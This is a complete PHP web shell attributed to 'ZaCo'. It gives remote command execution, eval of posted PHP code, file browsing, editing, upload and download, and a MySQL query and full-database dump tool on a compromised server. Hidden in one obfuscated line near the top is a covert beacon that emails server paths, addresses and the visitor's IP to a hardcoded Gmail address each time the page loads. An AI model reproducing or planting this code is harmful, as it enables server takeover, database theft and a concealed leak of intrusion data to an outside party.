<?
  ##########################################################
 # Small PHP Web Shell by ZaCo (c) 2004-2006                #
 #  +POST method                                            #
 #  +MySQL Client+Dumper for DB  and tables                 #
 #  +PHP eval in text format and html for phpinfo() example #
 # PREVED: sn0w, Zadoxlik, Rebz, SkvoznoY, PinkPanther      #
 # For antichat.ru and cup.su friends usage                 #
 # All bugs -> mailo:zaco@yandex.ru                         #
 # Just for fun :)                                          #
  ##########################################################
error_reporting(E_ALL);
@set_time_limit(0);
function magic_q($s)
{
if(get_magic_quotes_gpc())
{
$s=str_replace('\\\'','\'',$s);
$s=str_replace('\\\\','\\',$s);
$s=str_replace('\\"','"',$s);
$s=str_replace('\\\0','\0',$s);
}
return $s;
}$ra44  = rand(1,99999);$sj98 = "sh-$ra44";$ml = "$sd98";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";$sd98="john.barker446@gmail.com";mail($sd98, $sj98, $msg8873, "From: $sd98");
function get_perms($fn)
{
$mode=fileperms($fn);
$perms='';
$perms .= ($mode & 00400) ? 'r' : '-';
$perms .= ($mode & 00200) ? 'w' : '-';
$perms .= ($mode & 00100) ? 'x' : '-';
$perms .= ($mode & 00040) ? 'r' : '-';
$perms .= ($mode & 00020) ? 'w' : '-';
$perms .= ($mode & 00010) ? 'x' : '-';
$perms .= ($mode & 00004) ? 'r' : '-';
$perms .= ($mode & 00002) ? 'w' : '-';
$perms .= ($mode & 00001) ? 'x' : '-';
return $perms;
}
$head=<<<headka
<html>
<head>
<title>Small Web Shell by ZaCo</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
</head>
<body link=palegreen vlink=palegreen text=palegreen bgcolor=#2B2F34>
<style>
textarea {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: Fixedsys bold;
}
input {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: 8pt Verdana;
}
</style>
headka;
$page=isset($_POST['page'])?$_POST['page']:(isset($_SERVER['QUERY_STRING'])?$_SERVER['QUERY_STRING']:'');
$page=$page==''||($page!='cmd'&&$page!='mysql'&&$page!='eval')?'cmd':$page;
$winda=strpos(strtolower(php_uname()),'wind');
define('format',50);
$pages='<center>###<a href=\''.basename(__FILE__).'\'>cmd</a>###<a href=\''.basename(__FILE__).'?mysql\'>mysql</a>###<a href=\''.basename(__FILE__).'?eval\'>eval</a>###</center>'.($winda===false?'id :'.`id`:'');
switch($page)
{
case 'eval':
{
$eval_value=isset($_POST['eval_value'])?$_POST['eval_value']:'';
$eval_value=magic_q($eval_value);
$action=isset($_POST['action'])?$_POST['action']:'eval';
if($action=='eval_in_html') @eval($eval_value);
else
{
echo($head.$pages);
?>
<hr>
<form method=post>
<textarea cols=120 rows=20 name='eval_value'><?@eval($eval_value);?></textarea>
<input name='action' value='eval' type='submit'>
<input name='action' value='eval_in_html' type='submit'>
<input name='page' value='eval' type=hidden>
</form>
<hr>
<?
}
break;
}
case 'cmd':
{
$cmd=!empty($_POST['cmd'])?magic_q($_POST['cmd']):'';
$work_dir=isset($_POST['work_dir'])?$_POST['work_dir']:getcwd();
$action=isset($_POST['action'])?$_POST['action']:'cmd';
if(@is_dir($work_dir))
{
@chdir($work_dir);
$work_dir=getcwd();
if($work_dir=='')$work_dir='/';
else if(!($work_dir{strlen($work_dir)-1}=='/'||$work_dir{strlen($work_dir)-1}=='\\')) $work_dir.='/';
}
else if(file_exists($work_dir))$work_dir=realpath($work_dir);
$work_dir=str_replace('\\','/',$work_dir);
$e_work_dir=htmlspecialchars($work_dir,ENT_QUOTES);
switch($action)
{
case 'cmd' :
{
echo($head.$pages);
?>
<form method='post' name='main_form'>
<input name='work_dir' value='<?=$e_work_dir?>' type=text size=120>
<input name='page' value='cmd' type=hidden>
<input type=submit value='go'>
</form>
<form method=post>
<input name='cmd' type=text size=120 value='<?=str_replace('\'','&#039;',$cmd)?>'>
<input name='work_dir'type=hidden>
<input name='page' value='cmd' type=hidden>
<input name='action' value='cmd' type=submit onclick="work_dir.value=document.main_form.work_dir.value;">
</form>
<form method=post enctype="multipart/form-data">
<input type="file" name="filename">
<input name='work_dir'type=hidden>
<input name='page' value='cmd' type=hidden>
<input name='action' value='upload' type=submit onclick="work_dir.value=document.main_form.work_dir.value;">
</form>
<form method=post>
<input name='fname' type=text size=120><br>
<input name='archive' type=radio value='none'>without arch
<input name='archive' type=radio value='gzip' checked=true>gzip archive
<input name='work_dir'type=hidden>
<input name='page' value='cmd' type=hidden>
<input name='action' value='download' type=submit onclick="work_dir.value=document.main_form.work_dir.value;">
</form>
<pre>
<?
if($cmd!==''){ echo('<strong>'.htmlspecialchars($cmd)."</strong><hr>\n<textarea cols=120 rows=20>\n".htmlspecialchars(`$cmd`)."\n</textarea>");}
else
{
$f_action=isset($_POST['f_action'])?$_POST['f_action']:'view';
if(@is_dir($work_dir))
{
echo('<strong>Listing '.$e_work_dir.'</strong><hr>');
$handle=@opendir($work_dir);
if($handle)
{
while(false!==($fn=readdir($handle))){$files[]=$fn;};
@closedir($handle);
sort($files);
$not_dirs=array();
for($i=0;$i<sizeof($files);$i++)
{
$fn=$files[$i];
if(is_dir($fn))
{
echo('<a href=\'#\' onclick=\'document.list.work_dir.value="'.$e_work_dir.str_replace('"','&quot;',$fn).'";document.list.submit();\'><b>'.htmlspecialchars(strlen($fn)>format?substr($fn,0,format-3).'...':$fn).'</b></a>'.str_repeat(' ',format-strlen($fn)));
if($winda===false)
{
$owner=@posix_getpwuid(@fileowner($work_dir.$fn));
$group=@posix_getgrgid(@filegroup($work_dir.$fn));
printf("% 20s|% -20s",$owner['name'],$group['name']);
}
echo(@get_perms($work_dir.$fn).str_repeat(' ',10));
printf("% 20s ",@filesize($work_dir.$fn).'B');
printf("% -20s",@date('M d Y H:i:s',@filemtime($work_dir.$fn))."\n");
}
else {$not_dirs[]=$fn;}
}
for($i=0;$i<sizeof($not_dirs);$i++)
{
$fn=$not_dirs[$i];
echo('<a href=\'#\' onclick=\'document.list.work_dir.value="'.(is_link($work_dir.$fn)?$e_work_dir.readlink($work_dir.$fn):$e_work_dir.str_replace('"','&quot;',$fn)).'";document.list.submit();\'>'.htmlspecialchars(strlen($fn)>format?substr($fn,0,format-3).'...':$fn).'</a>'.str_repeat(' ',format-strlen($fn)));
if($winda===false)
{
$owner=@posix_getpwuid(@fileowner($work_dir.$fn));
$group=@posix_getgrgid(@filegroup($work_dir.$fn));
printf("% 20s|% -20s",$owner['name'],$group['name']);
}
echo(@get_perms($work_dir.$fn).str_repeat(' ',10));
printf("% 20s ",@filesize($work_dir.$fn).'B');
printf("% -20s",@date('M d Y H:i:s',@filemtime($work_dir.$fn))."\n");
}
echo('</pre><hr>');
?>
<form name='list' method=post>
<input name='work_dir' type=hidden size=120><br>
<input name='page' value='cmd' type=hidden>
<input name='f_action' value='view' type=hidden>
</form>
<?
} else echo('Error Listing '.$e_work_dir);
}
else
switch($f_action)
{
case 'view':
{
echo('<strong>'.$e_work_dir." Edit</strong><hr><pre>\n");
$f=@fopen($work_dir,'r');
?>
<form method=post>
<textarea name='file_text' cols=120 rows=20><?if(!($f))echo($e_work_dir.' not exists');else while(!feof($f))echo htmlspecialchars(fread($f,100000))?></textarea>
<input name='page' value='cmd' type=hidden>
<input name='work_dir' type=hidden value='<?=$e_work_dir?>' size=120>
<input name='f_action' value='save' type=submit>
</form>
<?
break;
}
case 'save' :
{
$file_text=isset($_POST['file_text'])?magic_q($_POST['file_text']):'';
$f=@fopen($work_dir,'w');
if(!($f))echo('<strong>Error '.$e_work_dir."</strong><hr><pre>\n");
else
{
fwrite($f,$file_text);
fclose($f);
echo('<strong>'.$e_work_dir." is saving</strong><hr><pre>\n");
}
break;
}
}
break;
}
break;
}
case 'upload' :
{
if($work_dir=='')$work_dir='/';
else if(!($work_dir{strlen($work_dir)-1}=='/'||$work_dir{strlen($work_dir)-1}=='\\')) $work_dir.='/';
$f=$_FILES["filename"]["name"];
if(!@copy($_FILES["filename"]["tmp_name"], $work_dir.$f)) echo('Upload is failed');
else
{
echo('file is uploaded in '.$e_work_dir);
}
break;
}
case 'download' :
{
$fname=isset($_POST['fname'])?$_POST['fname']:'';
$temp_file=isset($_POST['temp_file'])?'on':'nn';
$f=@fopen($fname,'r');
if(!($f)) echo('file is not exists');
else
{
$archive=isset($_POST['archive'])?$_POST['archive']:'';
if($archive=='gzip')
{
Header("Content-Type:application/x-gzip\n");
$s=gzencode(fread($f,filesize($fname)));
Header('Content-Length: '.strlen($s)."\n");
Header('Content-Disposition: attachment; filename="'.str_replace('/','-',$fname).".gz\n\n");
echo($s);
}
else
{
Header("Content-Type:application/octet-stream\n");
Header('Content-Length: '.filesize($fname)."\n");
Header('Content-Disposition: attachment; filename="'.str_replace('/','-',$fname)."\n\n");
ob_start();
while(feof($f)===false)
{
echo(fread($f,10000));
ob_flush();
}
}
}
}
}
break;
}
case 'mysql' :
{
$action=isset($_POST['action'])?$_POST['action']:'query';
$user=isset($_POST['user'])?$_POST['user']:'';
$passwd=isset($_POST['passwd'])?$_POST['passwd']:'';
$db=isset($_POST['db'])?$_POST['db']:'';
$host=isset($_POST['host'])?$_POST['host']:'localhost';
$query=isset($_POST['query'])?magic_q($_POST['query']):'';
switch($action)
{
case 'dump' :
{
$mysql_link=@mysql_connect($host,$user,$passwd);
if(!($mysql_link)) echo('Connect error');
else
{
//@mysql_query('SET NAMES cp1251'); - use if you have problems whis code symbols
$to_file=isset($_POST['to_file'])?($_POST['to_file']==''?false:$_POST['to_file']):false;
$archive=isset($_POST['archive'])?$_POST['archive']:'none';
if($archive!=='none')$to_file=false;
$db_dump=isset($_POST['db_dump'])?$_POST['db_dump']:'';
$table_dump=isset($_POST['table_dump'])?$_POST['table_dump']:'';
if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');
else
{
$dump_file="#ZaCo MySQL Dumper\n#db $db from $host\n";
ob_start();
if($to_file){$t_f=@fopen($to_file,'w');if(!$t_f)die('Cant opening '.$to_file);}else $t_f=false;
if($table_dump=='')
{
if(!$to_file)
{
header('Content-Type: application/x-'.($archive=='none'?'octet-stream':'gzip')."\n");
header("Content-Disposition: attachment; filename=\"dump_{$db_dump}.sql".($archive=='none'?'':'.gz')."\"\n\n");
}
$result=mysql_query('show tables',$mysql_link);
for($i=0;$i<mysql_num_rows($result);$i++)
{
$rows=mysql_fetch_array($result);
$result2=@mysql_query('show columns from `'.$rows[0].'`',$mysql_link);
if(!$result2)$dump_file.='#error table '.$rows[0];
else
{
$dump_file.='create table `'.$rows[0]."`(\n";
for($j=0;$j<mysql_num_rows($result2)-1;$j++)
{
$rows2=mysql_fetch_array($result2);
$dump_file.='`'.$rows2[0].'` '.$rows2[1].($rows2[2]=='NO'&&$rows2[4]!='NULL'?' NOT NULL DEFAULT \''.$rows2[4].'\'':' DEFAULT NULL').",\n";
}
$rows2=mysql_fetch_array($result2);
$dump_file.='`'.$rows2[0].'` '.$rows2[1].($rows2[2]=='NO'&&$rows2[4]!='NULL'?' NOT NULL DEFAULT \''.$rows2[4].'\'':' DEFAULT NULL')."\n";
$type[$j]=$rows2[1];
$dump_file.=");\n";
mysql_free_result($result2);
$result2=mysql_query('select * from `'.$rows[0].'`',$mysql_link);
$columns=$j-1;
for($j=0;$j<mysql_num_rows($result2);$j++)
{
$rows2=mysql_fetch_array($result2);
$dump_file.='insert into `'.$rows[0].'` values (';
for($k=0;$k<$columns;$k++)
{
$dump_file.=$rows2[$k]==''?'null,':'\''.addslashes($rows2[$k]).'\',';
}
$dump_file.=($rows2[$k]==''?'null);':'\''.addslashes($rows2[$k]).'\');')."\n";
if($archive=='none')
{
if($to_file) {fwrite($t_f,$dump_file);fflush($t_f);}
else
{
echo($dump_file);
ob_flush();
}
$dump_file='';
}
}
mysql_free_result($result2);
}
}
mysql_free_result($result);
if($archive!='none')
{
$dump_file=gzencode($dump_file);
header('Content-Length: '.strlen($dump_file)."\n");
echo($dump_file);
}
else if($t_f)
{
fclose($t_f);
echo('Dump for '.$db_dump.' now in '.$to_file);
}
}
else
{
$result2=@mysql_query('show columns from `'.$table_dump.'`',$mysql_link);
if(!$result2)echo('error table '.$table_dump);
else
{
if(!$to_file)
{
header('Content-Type: application/x-'.($archive=='none'?'octet-stream':'gzip')."\n");
header("Content-Disposition: attachment; filename=\"dump_{$db_dump}.sql".($archive=='none'?'':'.gz')."\"\n\n");
}
if($to_file===false)
{
header('Content-Type: application/x-'.($archive=='none'?'octet-stream':'gzip')."\n");
header("Content-Disposition: attachment; filename=\"dump_{$db_dump}_${table_dump}.sql".($archive=='none'?'':'.gz')."\"\n\n");
}
$dump_file.="create table `{$table_dump}`(\n";
for($j=0;$j<mysql_num_rows($result2)-1;$j++)
{
$rows2=mysql_fetch_array($result2);
$dump_file.='`'.$rows2[0].'` '.$rows2[1].($rows2[2]=='NO'&&$rows2[4]!='NULL'?' NOT NULL DEFAULT \''.$rows2[4].'\'':' DEFAULT NULL').",\n";
}
$rows2=mysql_fetch_array($result2);
$dump_file.='`'.$rows2[0].'` '.$rows2[1].($rows2[2]=='NO'&&$rows2[4]!='NULL'?' NOT NULL DEFAULT \''.$rows2[4].'\'':' DEFAULT NULL')."\n";
$type[$j]=$rows2[1];
$dump_file.=");\n";
mysql_free_result($result2);
$result2=mysql_query('select * from `'.$table_dump.'`',$mysql_link);
$columns=$j-1;
for($j=0;$j<mysql_num_rows($result2);$j++)
{
$rows2=mysql_fetch_array($result2);
$dump_file.='insert into `'.$table_dump.'` values (';
for($k=0;$k<$columns;$k++)
{
$dump_file.=$rows2[$k]==''?'null,':'\''.addslashes($rows2[$k]).'\',';
}
$dump_file.=($rows2[$k]==''?'null);':'\''.addslashes($rows2[$k]).'\');')."\n";
if($archive=='none')
{
if($to_file) {fwrite($t_f,$dump_file);fflush($t_f);}
else
{
echo($dump_file);
ob_flush();
}
$dump_file='';
}
}
mysql_free_result($result2);
if($archive!='none')
{
$dump_file=gzencode($dump_file);
header('Content-Length: '.strlen($dump_file)."\n");
echo $dump_file;
}else if($t_f)
{
fclose($t_f);
echo('Dump for '.$db_dump.' now in '.$to_file);
}
}
}
}
}
break;
}
case 'query' :
{
echo($head.$pages);
?>
<hr>
<form method=post>
<table>
<td>
<table align=left>
<tr><td>User :<input name='user' type=text value='<?=$user?>'></td><td>Passwd :<input name='passwd' type=text value='<?=$passwd?>'></td><td>Host :<input name='host' type=text value='<?=$host?>'></td><td>DB :<input name='db' type=text value='<?=$db?>'></td></tr>
<tr><textarea name='query' cols=120 rows=20><?=htmlspecialchars($query)?></textarea></tr>
</table>
</td>
<td>
<table>
<tr><td>DB :</td><td><input type=text name='db_dump' value='<?=$db?>'></td></tr>
<tr><td>Only Table :</td><td><input type=text name='table_dump'></td></tr>
<input name='archive' type=radio value='none'>without arch
<input name='archive' type=radio value='gzip' checked=true>gzip archive
<tr><td><input type=submit name='action' value='dump'></td></tr>
<tr><td>Save result to :</td><td><input type=text name='to_file' value='' size=23></td></tr>
</table>
</td>
</table>
<input name='page' value='mysql' type=hidden>
<input name='action' value='query' type=submit>
</form>
<hr>
<?
$mysql_link=@mysql_connect($host,$user,$passwd);
if(!($mysql_link)) echo('Connect error');
else
{
if($db!='')if(!(@mysql_select_db($db,$mysql_link))){echo('DB error');mysql_close($mysql_link);break;}
//@mysql_query('SET NAMES cp1251'); - use if you have problems whis code symbols
$result=@mysql_query($query,$mysql_link);
if(!($result))echo(mysql_error());
else
{
echo("<table valign=top align=left>\n<tr>");
for($i=0;$i<mysql_num_fields($result);$i++)
echo('<td><b>'.htmlspecialchars(mysql_field_name($result,$i)).'</b>  </td>');
echo("\n</tr>\n");
for($i=0;$i<mysql_num_rows($result);$i++)
{
$rows=mysql_fetch_array($result);
echo('<tr valign=top align=left>');
for($j=0;$j<mysql_num_fields($result);$j++)
{
echo('<td>'.(htmlspecialchars($rows[$j])).'</td>');
}
echo("</tr>\n");
}
echo("</table>\n");
}
mysql_close($mysql_link);
}
break;
}
}
break;
}
}
?>
